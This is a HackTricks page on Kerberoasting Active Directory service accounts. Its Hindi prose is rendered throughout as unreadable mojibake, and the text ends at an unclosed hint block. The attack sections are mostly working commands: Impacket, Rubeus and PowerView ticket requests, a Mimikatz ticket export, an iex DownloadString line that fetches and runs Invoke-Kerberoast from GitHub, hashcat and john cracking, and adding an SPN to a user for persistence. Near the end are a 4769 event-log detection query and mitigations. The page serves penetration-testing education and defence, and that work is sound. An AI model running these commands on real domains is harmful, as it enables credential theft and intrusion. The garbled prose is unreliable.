# Kerberoast

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ рдФрд░ **рджреБрдирд┐рдпрд╛ рдХреЗ рд╕рдмрд╕реЗ рдЙрдиреНрдирдд рд╕рдореБрджрд╛рдп рдЙрдкрдХрд░рдгреЛрдВ** рджреНрд╡рд╛рд░рд╛ рд╕рдВрдЪрд╛рд▓рд┐рдд **рдХрд╛рд░реНрдпрдкреНрд░рд╡рд╛рд╣реЛрдВ** рдХреЛ рдЖрд╕рд╛рдиреА рд╕реЗ рдирд┐рд░реНрдорд┐рдд рдФрд░ **рд╕реНрд╡рдЪрд╛рд▓рд┐рдд** рдХрд░реЗрдВред\
рдЖрдЬ рд╣реА рдкрд╣реБрдВрдЪреЗрдВ:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>рд╢реВрдиреНрдп рд╕реЗ рд╣реАрд░реЛ рддрдХ AWS рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> рдХреЗ рд╕рд╛рде!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЕрдкрдиреА рдХрдВрдкрдиреА рдХреЛ **HackTricks рдореЗрдВ рд╡рд┐рдЬреНрдЮрд╛рдкрд┐рдд** рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб** рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рддреЛ [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдВ рджреЗрдЦреЗрдВ**](https://github.com/sponsors/carlospolop)!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS рдФрд░ HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* рд╣рдорд╛рд░реЗ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣, **The PEASS Family** рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** ЁЯТм [**рдбрд┐рд╕реНрдХреЙрд░реНрдб рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдФрд░ рд╣рдореЗрдВ **рдЯреНрд╡рд┐рдЯрд░** ЁЯРж [**@carlospolopm**](https://twitter.com/hacktricks\_live)** рдкрд░ рдлреЙрд▓реЛ** рдХрд░реЗрдВред
* **HackTricks** рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдореЗрдВ **PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ** рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВред

</details>

## Kerberoast

Kerberoasting **TGS tickets** рдХреА рдкреНрд░рд╛рдкреНрддрд┐ рдкрд░ рдзреНрдпрд╛рди рдХреЗрдВрджреНрд░рд┐рдд рд╣реИ, рд╡рд┐рд╢реЗрд╖ рд░реВрдк рд╕реЗ рдЙрдирдХреЗ рд╕реЗрд╡рд╛рдУрдВ рдХреЗ рд▓рд┐рдП рдЬреЛ **Active Directory (AD)** рдореЗрдВ **рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЦрд╛рддреЛрдВ** рдХреЗ рддрд╣рдд рдХрд╛рд░реНрдп рдХрд░ рд░рд╣реЗ рд╣реИрдВ, **рдХрдВрдкреНрдпреВрдЯрд░ рдЦрд╛рддреЛрдВ** рдХреЛ рдЫреЛрдбрд╝рдХрд░ред рдЗрди рдЯрд┐рдХрдЯреЛрдВ рдХреЗ рдПрдиреНрдХреНрд░рд┐рдкреНрд╢рди рдореЗрдВ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдкрд╛рд╕рд╡рд░реНрдб рд╕реЗ рдЙрддреНрдкрдиреНрди рдХреБрдВрдЬрд┐рдпреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рд╣реЛрддрд╛ рд╣реИ, рдЬрд┐рд╕рд╕реЗ **рдСрдлрд▓рд╛рдЗрди рдкреНрд░рдорд╛рдг рдкрдЯреНрдЯреА рдХреНрд░реИрдХрд┐рдВрдЧ** рдХреА рд╕рдВрднрд╛рд╡рдирд╛ рд╣реЛрддреА рд╣реИред рд╕реЗрд╡рд╛ рдХрд╛ рдЙрдкрдпреЛрдЧ рдПрдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЦрд╛рддрд╛ рджреНрд╡рд╛рд░рд╛ рд╕реВрдЪрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдЬрд┐рд╕рдХрд╛ **"ServicePrincipalName"** рдЧреБрдгрд╡рддреНрддрд╛ рдЦрд╛рд▓реА рдирд╣реАрдВ рд╣реИред

**Kerberoasting** рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, **TGS tickets** рдХрд╛ рдЕрдиреБрд░реЛрдз рдХрд░рдиреЗ рдХреА рдХреНрд╖рдорддрд╛ рд╡рд╛рд▓рд╛ рдбреЛрдореЗрди рдЦрд╛рддрд╛ рдЖрд╡рд╢реНрдпрдХ рд╣реИ; рд╣рд╛рд▓рд╛рдВрдХрд┐, рдпрд╣ рдкреНрд░рдХреНрд░рд┐рдпрд╛ **рд╡рд┐рд╢реЗрд╖ рдЕрдзрд┐рдХрд╛рд░** рдХреА рдорд╛рдВрдЧ рдирд╣реАрдВ рдХрд░рддреА, рдЬрд┐рд╕рд╕реЗ рдЗрд╕реЗ рдХрд┐рд╕реА рдХреЗ рдкрд╛рд╕ **рд╡реИрдз рдбреЛрдореЗрди рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓** рдХреЗ рд╕рд╛рде рдкрд╣реБрдВрдЪрдиреЗ рдореЗрдВ рд╕рд╣рд╛рдпрдХ рд╣реЛрддрд╛ рд╣реИред

### рдореБрдЦреНрдп рдмрд┐рдВрджреБ:

* **Kerberoasting** **AD** рдХреЗ рднреАрддрд░ **рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЦрд╛рдд рд╕реЗрд╡рд╛рдУрдВ** рдХреЗ рд▓рд┐рдП **TGS tickets** рдХреЛ рд▓рдХреНрд╖реНрдп рдмрдирд╛рддрд╛ рд╣реИред
* **рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдкрд╛рд╕рд╡рд░реНрдб** рд╕реЗ рдЙрддреНрдкрдиреНрди рдХреБрдВрдЬрд┐рдпреЛрдВ рд╕реЗ рдПрдиреНрдХреНрд░рд┐рдкреНрдЯ рдХрд┐рдП рдЧрдП рдЯрд┐рдХрдЯ **рдСрдлрд▓рд╛рдЗрди** рдХреНрд░реИрдХ рдХрд┐рдП рдЬрд╛ рд╕рдХрддреЗ рд╣реИрдВред
* рдПрдХ рд╕реЗрд╡рд╛ рдХреЛ рдПрдХ рдРрд╕рд╛ **ServicePrincipalName** рджреНрд╡рд╛рд░рд╛ рдкрд╣рдЪрд╛рдирд╛ рдЬрд╛рддрд╛ рд╣реИ рдЬреЛ рдЦрд╛рд▓реА рдирд╣реАрдВ рд╣реИред
* **рдХреЛрдИ рд╡рд┐рд╢реЗрд╖ рдЕрдзрд┐рдХрд╛рд░** рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рдирд╣реАрдВ рд╣реИ, рдХреЗрд╡рд▓ **рд╡реИрдз рдбреЛрдореЗрди рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓** рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИред

### **рд╣рдорд▓рд╛**

{% hint style="warning" %}
**Kerberoasting tools** рд╕рд╛рдорд╛рдиреНрдпрдд: **рд╣рдорд▓рд╛ рдХрд░рддреЗ рд╕рдордп** **`RC4 рдПрдиреНрдХреНрд░рд┐рдкреНрд╢рди`** рдХрд╛ рдЕрдиреБрд░реЛрдз рдХрд░рддреЗ рд╣реИрдВ рдФрд░ TGS-REQ рдЕрдиреБрд░реЛрдзреЛрдВ рдХреА рд╢реБрд░реБрдЖрдд рдХрд░рддреЗ рд╣реИрдВред рдЗрд╕рд▓рд┐рдП **RC4** [**рдХрдордЬреЛрд░**](https://www.stigviewer.com/stig/windows\_10/2017-04-28/finding/V-63795) рд╣реИ рдФрд░ рдЗрд╕реЗ рдЕрдиреНрдп рдПрдиреНрдХреНрд░рд┐рдкреНрд╢рди рдПрд▓реНрдЧреЛрд░рд┐рдереНрдореЛрдВ рдЬреИрд╕реЗ AES-128 рдФрд░ AES-256 рдХреЗ рдореБрдХрд╛рдмрд▓реЗ рдСрдлрд▓рд╛рдЗрди рдореЗрдВ рдХреНрд░реИрдХ рдХрд░рдирд╛ рдЖрд╕рд╛рди рд╣реИред\
RC4 (рдкреНрд░рдХрд╛рд░ 23) рд╣реИрд╢ **`$krb5tgs$23$*`** рд╕реЗ рд╢реБрд░реВ рд╣реЛрддреЗ рд╣реИрдВ рдЬрдмрдХрд┐ AES-256 (рдкреНрд░рдХрд╛рд░ 18) **`$krb5tgs$18$*`** рд╕реЗ рд╢реБрд░реВ рд╣реЛрддреЗ рд╣реИрдВред
{% endhint %}

#### **Linux**
```bash
# Metasploit framework
msf> use auxiliary/gather/get_user_spns
# Impacket
GetUserSPNs.py -request -dc-ip <DC_IP> <DOMAIN.FULL>/<USERNAME> -outputfile hashes.kerberoast # Password will be prompted
GetUserSPNs.py -request -dc-ip <DC_IP> -hashes <LMHASH>:<NTHASH> <DOMAIN>/<USERNAME> -outputfile hashes.kerberoast
# kerberoast: https://github.com/skelsec/kerberoast
kerberoast ldap spn 'ldap+ntlm-password://<DOMAIN.FULL>\<USERNAME>:<PASSWORD>@<DC_IP>' -o kerberoastable # 1. Enumerate kerberoastable users
kerberoast spnroast 'kerberos+password://<DOMAIN.FULL>\<USERNAME>:<PASSWORD>@<DC_IP>' -t kerberoastable_spn_users.txt -o kerberoast.hashes # 2. Dump hashes
```
### Multi-рдлреАрдЪрд░ рдЙрдкрдХрд░рдг рдЬрд┐рд╕рдореЗрдВ kerberoastable рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХрд╛ рдбрдВрдк рд╢рд╛рдорд┐рд▓ рд╣реИ:
```bash
# ADenum: https://github.com/SecuProject/ADenum
adenum -d <DOMAIN.FULL> -ip <DC_IP> -u <USERNAME> -p <PASSWORD> -c
```
#### Windows

* **рдХреЗрд░реНрдмреЗрд░реЛрд╕реНрдЯ рдХрд░рдиреЗ рдпреЛрдЧреНрдп рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХрд╛ рдЬрд╛рдВрдЪ рдХрд░реЗрдВ**
```powershell
# Get Kerberoastable users
setspn.exe -Q */* #This is a built-in binary. Focus on user accounts
Get-NetUser -SPN | select serviceprincipalname #Powerview
.\Rubeus.exe kerberoast /stats
```
* **рддрдХрдиреАрдХ 1: TGS рдХреЗ рд▓рд┐рдП рдЕрдиреБрд░реЛрдз рдХрд░реЗрдВ рдФрд░ рдпрд╣ рдореЗрдореЛрд░реА рд╕реЗ рдбрдВрдк рдХрд░реЗрдВ**
```powershell
#Get TGS in memory from a single user
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "ServicePrincipalName" #Example: MSSQLSvc/mgmt.domain.local

#Get TGSs for ALL kerberoastable accounts (PCs included, not really smart)
setspn.exe -T DOMAIN_NAME.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }

#List kerberos tickets in memory
klist

# Extract them from memory
Invoke-Mimikatz -Command '"kerberos::list /export"' #Export tickets to current folder

# Transform kirbi ticket to john
python2.7 kirbi2john.py sqldev.kirbi
# Transform john to hashcat
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat
```
* **рддрдХрдиреАрдХ 2: рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рдЙрдкрдХрд░рдг**
```bash
# Powerview: Get Kerberoast hash of a user
Request-SPNTicket -SPN "<SPN>" -Format Hashcat #Using PowerView Ex: MSSQLSvc/mgmt.domain.local
# Powerview: Get all Kerberoast hashes
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\kerberoast.csv -NoTypeInformation

# Rubeus
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
.\Rubeus.exe kerberoast /user:svc_mssql /outfile:hashes.kerberoast #Specific user
.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap #Get of admins

# Invoke-Kerberoast
iex (new-object Net.WebClient).DownloadString("https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1")
Invoke-Kerberoast -OutputFormat hashcat | % { $_.Hash } | Out-File -Encoding ASCII hashes.kerberoast
```
{% hint style="warning" %}
рдЬрдм рдПрдХ TGS рдХрд╛ рдЕрдиреБрд░реЛрдз рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рддреЛ Windows рдШрдЯрдирд╛ `4769 - рдПрдХ рдХреЗрд░рдмреЗрд░реЛрд╕ рд╕реЗрд╡рд╛ рдЯрд┐рдХрдЯ рдХрд╛ рдЕрдиреБрд░реЛрдз рдХрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛` рдЙрддреНрдкрдиреНрди рд╣реЛрддреА рд╣реИред
{% endhint %}

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ рдФрд░ рдЖрд╕рд╛рдиреА рд╕реЗ **рд╡рд░реНрд▓реНрдб рдХреЗ рд╕рдмрд╕реЗ рдЙрдиреНрдирдд** рд╕рдореБрджрд╛рдп рдЙрдкрдХрд░рдгреЛрдВ рджреНрд╡рд╛рд░рд╛ рд╕рдВрдЪрд╛рд▓рд┐рдд **рдХрд╛рд░реНрдпрдкреНрд░рд╡рд╛рд╣** рдмрдирд╛рдПрдВ рдФрд░ рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рдХрд░реЗрдВред\
рдЖрдЬ рд╣реА рдкрд╣реБрдВрдЪреЗрдВ:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

### рдХреНрд░реИрдХрд┐рдВрдЧ
```bash
john --format=krb5tgs --wordlist=passwords_kerb.txt hashes.kerberoast
hashcat -m 13100 --force -a 0 hashes.kerberoast passwords_kerb.txt
./tgsrepcrack.py wordlist.txt 1-MSSQLSvc~sql01.medin.local~1433-MYDOMAIN.LOCAL.kirbi
```
### рд╕реНрдерд┐рд░рддрд╛

рдпрджрд┐ рдЖрдкрдХреЗ рдкрд╛рд╕ рдПрдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдкрд░ **рдкрд░реНрдпрд╛рдкреНрдд рдЕрдиреБрдорддрд┐рдпрд╛рдБ** рд╣реИрдВ рддреЛ рдЖрдк рдЗрд╕реЗ **рдХреЗрд░реНрдмреЗрд░реЛрд╕реНрдЯреЗрдмрд▓** рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
Set-DomainObject -Identity <username> -Set @{serviceprincipalname='just/whateverUn1Que'} -verbose
```
рдЖрдк **kerberoast** рд╣рдорд▓реЛрдВ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧреА **рдЙрдкрдХрд░рдг** рдпрд╣рд╛рдБ рдкрд╛ рд╕рдХрддреЗ рд╣реИрдВ: [https://github.com/nidem/kerberoast](https://github.com/nidem/kerberoast)

рдпрджрд┐ рдЖрдкрдХреЛ рд▓рд┐рдирдХреНрд╕ рд╕реЗ рдпрд╣ **рддреНрд░реБрдЯрд┐** рдорд┐рд▓рддреА рд╣реИ: **`Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)`** рддреЛ рдпрд╣ рдЖрдкрдХреЗ рд╕реНрдерд╛рдиреАрдп рд╕рдордп рдХреА рд╡рдЬрд╣ рд╕реЗ рд╣реИ, рдЖрдкрдХреЛ рд╣реЛрд╕реНрдЯ рдХреЛ рдбреАрд╕реА рдХреЗ рд╕рд╛рде рд╕рдордХреНрд░рдорд┐рдд рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИред рдХреБрдЫ рд╡рд┐рдХрд▓реНрдк рд╣реИрдВ:

* `ntpdate <DC рдХрд╛ IP>` - Ubuntu 16.04 рдХреЗ рд░реВрдк рдореЗрдВ рдкреБрд░рд╛рдирд╛ рд╣реЛ рдЧрдпрд╛ рд╣реИ
* `rdate -n <DC рдХрд╛ IP>`

### рд╕рдВрд░реЛрдзрди

рдХрд░рдмреЗрд░реЛрд╕реНрдЯрд┐рдВрдЧ рдПрдХ рдЙрдЪреНрдЪ рд╕реНрддрд░ рдкрд░ рдЧреБрдкреНрддрддрд╛ рдХреЗ рд╕рд╛рде рдХреА рдЬрд╛ рд╕рдХрддреА рд╣реИ рдЕрдЧрд░ рдпрд╣ рд╢реЛрд╖рдгреАрдп рд╣реИред рдЗрд╕ рдЧрддрд┐рд╡рд┐рдзрд┐ рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рдиреЗ рдХреЗ рд▓рд┐рдП, рдзреНрдпрд╛рди рджрд┐рдпрд╛ рдЬрд╛рдирд╛ рдЪрд╛рд╣рд┐рдП **рд╕реБрд░рдХреНрд╖рд╛ рдШрдЯрдирд╛ рдЖрдИрдбреА 4769** рдкрд░, рдЬреЛ рдЗрд╕рдХрд╛ рд╕рдВрдХреЗрдд рджреЗрддрд╛ рд╣реИ рдХрд┐ рдПрдХ рдХрд░рдмреЗрд░реЛрд╕ рдЯрд┐рдХрдЯ рдХрд╛ рдЕрдиреБрд░реЛрдз рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИред рд╣рд╛рд▓рд╛рдВрдХрд┐, рдЗрд╕ рдШрдЯрдирд╛ рдХреА рдЙрдЪреНрдЪ рдЖрд╡реГрддреНрддрд┐ рдХреЗ рдХрд╛рд░рдг, рд╕рдВрджреЗрд╣рдкреВрд░реНрдг рдЧрддрд┐рд╡рд┐рдзрд┐рдпреЛрдВ рдХреЛ рдЕрд▓рдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╡рд┐рд╢реЗрд╖ рдлрд┐рд▓реНрдЯрд░ рд▓рд╛рдЧреВ рдХрд┐рдП рдЬрд╛рдиреЗ рдЪрд╛рд╣рд┐рдП:

* рд╕реЗрд╡рд╛ рдХрд╛ рдирд╛рдо **krbtgt** рдирд╣реАрдВ рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдП, рдХреНрдпреЛрдВрдХрд┐ рдпрд╣ рдПрдХ рд╕рд╛рдорд╛рдиреНрдп рдЕрдиреБрд░реЛрдз рд╣реИред
* рд╕реЗрд╡рд╛ рдХреЗ рдирд╛рдо рдореЗрдВ **$** рд╕рдорд╛рдкреНрдд рд╣реЛрдиреЗ рдЪрд╛рд╣рд┐рдП рддрд╛рдХрд┐ рд╕реЗрд╡рд╛рдУрдВ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреБрдХреНрдд рдорд╢реАрди рдЦрд╛рддреЛрдВ рдХреЛ рд╢рд╛рдорд┐рд▓ рди рдХрд┐рдпрд╛ рдЬрд╛рдПред
* рдорд╢реАрдиреЛрдВ рд╕реЗ рдЕрдиреБрд░реЛрдзреЛрдВ рдХреЛ рдлрд╝рд┐рд▓реНрдЯрд░ рдХрд░рдирд╛ рдЪрд╛рд╣рд┐рдП, рдЬрд┐рд╕рдореЗрдВ рдЦрд╛рддрд╛ рдирд╛рдо рдХреЛ **machine@domain** рдХреЗ рд░реВрдк рдореЗрдВ рд╕реНрд╡рд░реВрдкрд┐рдд рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реЛред
* рдХреЗрд╡рд▓ рд╕рдлрд▓ рдЯрд┐рдХрдЯ рдЕрдиреБрд░реЛрдз рдХреЛ рд╡рд┐рдЪрд╛рд░ рдореЗрдВ рд▓реЗрдирд╛ рдЪрд╛рд╣рд┐рдП, рдЬрд┐рд╕реЗ **'0x0'** рд╡рд┐рдлрд▓рддрд╛ рдХреЛрдб рджреНрд╡рд╛рд░рд╛ рдкрд╣рдЪрд╛рдирд╛ рдЬрд╛рддрд╛ рд╣реИред
* **рд╕рдмрд╕реЗ рдорд╣рддреНрд╡рдкреВрд░реНрдг**, рдЯрд┐рдХрдЯ рдПрдиреНрдХреНрд░рд┐рдкреНрд╢рди рдкреНрд░рдХрд╛рд░ **0x17** рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдП, рдЬреЛ рдЕрдХреНрд╕рд░ рдХрд░рдмреЗрд░реЛрд╕реНрдЯрд┐рдВрдЧ рд╣рдорд▓реЛрдВ рдореЗрдВ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред
```bash
Get-WinEvent -FilterHashtable @{Logname='Security';ID=4769} -MaxEvents 1000 | ?{$_.Message.split("`n")[8] -ne 'krbtgt' -and $_.Message.split("`n")[8] -ne '*$' -and $_.Message.split("`n")[3] -notlike '*$@*' -and $_.Message.split("`n")[18] -like '*0x0*' -and $_.Message.split("`n")[17] -like "*0x17*"} | select ExpandProperty message
```
рдЦрддрд░реЗ рдХреЛ рдХрдо рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП Kerberoasting рдХрд╛ рдЬреЛрдЦрд┐рдо рдХрдо рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП:

* рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░реЗрдВ рдХрд┐ **рд╕реЗрд╡рд╛ рдЦрд╛рддрд╛ рдкрд╛рд╕рд╡рд░реНрдб рдХрдард┐рди рд╣реЛ** рдФрд░ **25 рдЕрдХреНрд╖рд░** рд╕реЗ рдЕрдзрд┐рдХ рд╣реЛрдиреЗ рдХреА рд╕рд┐рдлрд╛рд░рд┐рд╢ рдХрд░реЗрдВред
* **рдкреНрд░рдмрдВрдзрд┐рдд рд╕реЗрд╡рд╛ рдЦрд╛рддреЗ** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ, рдЬреЛ **рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рдкрд╛рд╕рд╡рд░реНрдб рдкрд░рд┐рд╡рд░реНрддрди** рдФрд░ **рдзреНрдпрд╛рдирд╛рдХрд░реНрд╖рдг рд╕реЗрд╡рд╛ рдкреНрд░рд┐рдВрд╕рд┐рдкрд▓ рдирд╛рдо (SPN) рдкреНрд░рдмрдВрдзрди** рдЬреИрд╕реЗ рд▓рд╛рдн рдкреНрд░рджрд╛рди рдХрд░рддреЗ рд╣реИрдВ, рдЬреЛ рдЗрд╕ рддрд░рд╣ рдХреЗ рд╣рдорд▓реЛрдВ рдХреЗ рдЦрд┐рд▓рд╛рдл рд╕реБрд░рдХреНрд╖рд╛ рдХреЛ рдмрдврд╝рд╛рд╡рд╛ рджреЗрддреЗ рд╣реИрдВред

рдЗрди рдЙрдкрд╛рдпреЛрдВ рдХреЛ рд▓рд╛рдЧреВ рдХрд░рдХреЗ рд╕рдВрдЧрдарди Kerberoasting рдХреЗ рд╕рд╛рде рдЬреБрдбрд╝реЗ рдЬреЛрдЦрд┐рдо рдХреЛ рдХрд╛рдлреА рдХрдо рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

## рдбреЛрдореЗрди рдЦрд╛рддрд╛ рдХреЗ рдмрд┐рдирд╛ Kerberoast

**рд╕рд┐рддрдВрдмрд░ 2022** рдореЗрдВ, рдПрдХ рдирдП рддрд░реАрдХреЗ рд╕реЗ рдПрдХ рд╕рд┐рд╕реНрдЯрдо рдХрд╛ рд╢реЛрдз рдХрд░рдиреЗ рдХрд╛ рдПрдХ рдирдпрд╛ рддрд░реАрдХрд╛ рдПрдХ рд╢реЛрдзрдХрд░реНрддрд╛ рдирд╛рдордХ рдЪрд╛рд░реНрд▓реА рдХреНрд▓рд╛рд░реНрдХ рджреНрд╡рд╛рд░рд╛ рд╕рд╛рдЭрд╛ рдХрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛, рдЬрд┐рд╕реЗ рдЙрдиреНрд╣реЛрдВрдиреЗ рдЕрдкрдиреЗ рдкреНрд▓реЗрдЯрдлрд╝реЙрд░реНрдо [exploit.ph](https://exploit.ph/) рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд╕рд╛рдЭрд╛ рдХрд┐рдпрд╛ рдерд╛ред рдЗрд╕ рд╡рд┐рдзрд┐ рдХреА рдорджрдж рд╕реЗ **рд╕реЗрд╡рд╛ рдЯрд┐рдХрдЯреНрд╕ (ST)** рдХреА рдкреНрд░рд╛рдкреНрддрд┐ рдХреА рдЬрд╛ рд╕рдХрддреА рд╣реИ рдПрдХ **KRB\_AS\_REQ** рдЕрдиреБрд░реЛрдз рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ, рдЬреЛ рд╡рд╛рд╕реНрддрд╡ рдореЗрдВ рдХрд┐рд╕реА рднреА рд╕рдХреНрд░рд┐рдп рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдЦрд╛рддреЗ рдкрд░ рдирд┐рдпрдВрддреНрд░рдг рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рдирд╣реАрдВ рд╣реИред рдореВрд▓ рд░реВрдк рд╕реЗ, рдпрджрд┐ рдПрдХ рдкреНрд░рдореБрдЦ рдЗрд╕ рддрд░рд╣ рд╕реЗ рд╕реЗрдЯ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ рдХрд┐ рдЗрд╕реЗ рдкреВрд░реНрд╡-рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рдирд╣реАрдВ рд╣реИ - рдПрдХ рд╕реНрдерд┐рддрд┐ рдЬреЛ рд╕рд╛рдЗрдмрд░ рд╕реБрд░рдХреНрд╖рд╛ рд╡рд┐рд╢реНрд╡ рдореЗрдВ рдПрдХ **AS-REP Roasting рд╣рдорд▓реЗ** рдХреЗ рд░реВрдк рдореЗрдВ рдЬрд╛рдирд╛ рдЬрд╛рддрд╛ рд╣реИ - рддреЛ рдЗрд╕ рд╡рд┐рд╢реЗрд╖рддрд╛ рдХрд╛ рдЙрдкрдпреЛрдЧ рдЕрдиреБрд░реЛрдз рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЛ рдардЧрдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рд╡рд┐рд╢реЗрд╖ рд░реВрдк рд╕реЗ, рдЕрдиреБрд░реЛрдз рдХреЗ рд╢рд░реАрд░ рдореЗрдВ **sname** рд╡рд┐рд╢реЗрд╖рддрд╛ рдХреЛ рдмрджрд▓рдХрд░, рд╕рд┐рд╕реНрдЯрдо рдХреЛ рдПрдХ **ST** рдЬрд╛рд░реА рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдзреЛрдЦрд╛ рджрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдмрдЬрд╛рдп рдорд╛рдирдХ рдПрдиреНрдХреНрд░рд┐рдкреНрдЯреЗрдб рдЯрд┐рдХрдЯ рдЧреНрд░рд╛рдВрдЯрд┐рдВрдЧ рдЯрд┐рдХрдЯ (TGT)ред

рдЗрд╕ рддрдХрдиреАрдХ рдХреЛ рдкреВрд░реА рддрд░рд╣ рд╕реЗ рдЗрд╕ рд▓реЗрдЦ рдореЗрдВ рд╕рдордЭрд╛рдпрд╛ рдЧрдпрд╛ рд╣реИ: [Semperis рдмреНрд▓реЙрдЧ рдкреЛрд╕реНрдЯ](https://www.semperis.com/blog/new-attack-paths-as-requested-sts/).

{% hint style="warning" %}
